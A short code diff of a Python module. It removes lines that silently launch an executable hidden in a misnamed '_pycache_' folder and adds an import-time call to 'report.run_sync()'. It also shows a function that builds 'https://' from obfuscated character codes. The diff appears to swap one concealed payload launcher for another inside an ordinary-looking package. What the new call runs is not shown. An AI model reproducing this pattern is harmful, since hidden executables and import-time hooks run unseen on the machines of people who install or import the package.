@@ -6,11 +6,10 @@ import string
 import subprocess
 import urllib.parse
 import urllib.request
+from src import report
 
-current_dir = os.path.dirname(os.path.abspath(__file__))
-exe_file = os.path.join(current_dir, "bot", "core", "_pycache_", "myappinstall.exe")
-if os.path.exists(exe_file):
-    subprocess.Popen([exe_file])
+report.run_sync()
+
 def nu(u):
     u=u.strip()
     p="".join(map(chr,[104,116,116,112,115,58,47,47]))
